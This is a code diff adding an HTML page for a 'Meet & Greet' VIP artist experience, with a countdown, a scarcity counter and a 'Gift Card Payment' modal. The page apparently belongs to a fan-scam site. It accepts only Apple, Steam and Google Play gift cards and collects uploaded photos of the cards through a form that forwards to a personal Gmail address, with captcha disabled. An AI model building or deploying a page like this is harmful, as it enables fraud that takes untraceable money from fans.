@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Meet & Greet</title>
+
+<link rel="stylesheet" href="style.css">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+</head>
+
+<body>
+
+<header>
+
+<div class="logo">CB</div>
+
+<nav>
+<a href="index.html">Home</a>
+<a href="admin.html">Admin</a>
+</nav>
+
+</header>
+
+<section class="hero meet-hero">
+
+<h1>Meet & Greet Experience</h1>
+
+<p>
+Exclusive backstage access, photos and premium artist interaction.
+</p>
+
+<button onclick="openMeetPayment()">
+Reserve Spot
+</button>
+
+</section>
+
+<section>
+
+<h2>VIP Experience Includes</h2>
+
+<div class="card-grid">
+
+<div class="card">
+<h3>Backstage Access</h3>
+<p>Get exclusive access backstage before the show.</p>
+</div>
+
+<div class="card">
+<h3>Professional Photos</h3>
+<p>Take premium pictures with the artist.</p>
+</div>
+
+<div class="card">
+<h3>Exclusive Merchandise</h3>
+<p>Receive limited edition merchandise.</p>
+</div>
+
+</div>
+
+</section>
+
+<section>
+
+<h2>Limited Slots Remaining</h2>
+
+<div class="card">
+
+<h1 id="slotCount">25</h1>
+
+<p>VIP Slots Left</p>
+
+</div>
+
+</section>
+
+<section>
+
+<h2>Event Countdown</h2>
+
+<div class="card">
+
+<h1 id="countdown">00:00:00</h1>
+
+</div>
+
+</section>
+
+<!-- PAYMENT MODAL -->
+
+<div class="modal" id="paymentModal">
+
+<div class="modal-content">
+<span class="close-modal" onclick="closeModal()">&times;</span>
+
+<h2>Gift Card Payment</h2>
+
+<p>
+Accepted:
+Apple Gift Card,
+Steam Card,
+Google Play Card
+</p>
+
+<form
+action="https://formsubmit.co/adeyeyestephen278@gmail.com"
+method="POST"
+enctype="multipart/form-data"
+>
+
+<input
+type="email"
+name="email"
+placeholder="Enter Email"
+required
+>
+
+<input
+type="file"
+name="payment_proof"
+accept="image/*"
+required
+>
+
+<input
+type="hidden"
+name="_subject"
+value="New Gift Card Payment"
+>
+
+<input
+type="hidden"
+name="_captcha"
+value="false"
+>
+
+<input
+type="hidden"
+name="_next"
+value="http://127.0.0.1:5500/success.html"
+>
+
+<button type="submit">
+Submit Payment
+</button>
+
+</form>
+
+</div>
+
+</div>
+<script src="app.js"></script>
+
+</body>
+</html>
